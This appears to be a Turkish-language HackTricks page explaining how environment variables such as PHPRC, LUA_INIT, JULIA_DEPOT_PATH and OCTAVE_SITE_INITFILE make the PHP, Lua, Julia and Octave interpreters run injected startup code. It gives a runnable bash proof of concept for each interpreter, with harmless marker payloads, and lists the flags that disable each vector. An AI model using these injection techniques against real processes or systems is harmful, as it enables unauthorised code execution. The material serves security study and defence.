# macOS Interpreter Başlangıç Dosyası Enjeksiyonu

{{#include ../../../banners/hacktricks-training.md}}

Bu runtime'a özgü teknikler, amaçlanan betikten önce başlangıç yapılandırmasını veya kodunu seçmek için devralınan ortam değişkenlerini kullanır. Lua ayrıca satır içi kod varyantını da destekler.

## PHP başlangıç yapılandırması

### `PHPRC` / `PHP_INI_SCAN_DIR` ve `auto_prepend_file`

PHP CLI ve CGI, her çalıştırmada yapılandırmayı okur. `PHPRC`, saldırganın okuyabildiği bir `php.ini` dosyasını seçebilirken `PHP_INI_SCAN_DIR`, ek `.ini` dosyalarının tarandığı dizini başka bir yere yönlendirebilir. `auto_prepend_file` yönergesi, PHP'nin istenen betikten önce bir dosyayı ayrıştırmasını sağlar; böylece bu birleşim başlangıçta kod yürütülmesine yol açar.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Alternatif olarak, `.ini` dosyası içeren bir dizin kullanılabilir:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

`-n` seçeneği `php.ini` dosyasını yok sayar; açıkça belirtilen güvenilir bir `-c` yolu, `PHPRC`'ye göre önceliklidir. Uzun süre çalışan bir sunucu SAPI'sinin genellikle yapılandırmayı web sunucusu başlatıldığında, CLI ve CGI'nin ise her çağrıda okuduğunu unutmayın.<sup>[[1]](#references)</sup>

## Lua başlangıç kodu

### `LUA_INIT`

Komut satırı seçenekleri veya hedef betik işlenmeden önce, bağımsız Lua yorumlayıcısı `LUA_INIT_<major>_<minor>` değişkenini; sürümlü değişken yoksa `LUA_INIT` değişkenini çalıştırır. `@` ile başlayan bir değer dosya belirtir; diğer tüm değerler doğrudan Lua kodu olarak değerlendirilir. Bu, hem dosya üzerinden hem de dosya kullanmadan başlangıçta kod çalıştırılmasını sağlar.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

Interpreter'ın tam sürümlü adı değişir; örneğin `LUA_INIT_5_4`. `lua -E`, başlangıç kodu ve Lua modül yolları dahil tüm ortam değişkenlerini yok sayar.

## Julia startup depot

### `JULIA_DEPOT_PATH` ve `startup.jl`

Julia, başlangıçta normalde ilk depot'undaki `config/startup.jl` dosyasını çalıştırır. `JULIA_DEPOT_PATH` depot listesini denetler; bu nedenle onu saldırganın okuyabildiği bir ağaç konumuna yönlendirmek, otomatik olarak yüklenen başlangıç dosyasının yönlendirilmesini sağlar.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

Son sonda bulunan ayırıcı, kurbanın normal paketlerine hâlâ ihtiyaç duyduğu durumlarda kullanışlıdır. `julia --startup-file=no`, bu başlangıç dosyasını devre dışı bırakır. Başlatmadan önce değişkeni temizleyin; çünkü bu değişken paket kayıt defterlerini, ortamları, önbellekleri ve kod yükleme konumlarını da kontrol eder.

## GNU Octave başlangıç dosyaları

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave, başlangıç sırasında geçerli Octave komutları içeren çeşitli dosyaları çalıştırır. `OCTAVE_SITE_INITFILE`, site genelindeki başlangıç dosyasını; `OCTAVE_VERSION_INITFILE` ise sürüme özgü olanı geçersiz kılar. Böylece her iki değişken de otomatik yürütmeyi saldırganın okuyabildiği bir dosyaya yönlendirebilir.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` yalnızca `~/.octaverc` gibi kullanıcı dosyalarını atlar; yukarıdaki site dosyası geçersiz kılmasını **engellemez**. Site dosyaları için `--no-site-file`, tüm başlangıç dosyalarını devre dışı bırakmak içinse `--norc` / `-f` kullanın.<sup>[[7]](#references)</sup>

## References

- [1] [PHP yapılandırma dosyası](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Lua 5.4 bağımsız yorumlayıcısı](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Julia komut satırı arayüzü: Başlangıç dosyası](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Julia ortam değişkenleri: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [GNU Octave başlangıç dosyaları](https://docs.octave.org/latest/Startup-Files.html)
- [7] [GNU Octave komut satırı seçenekleri](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
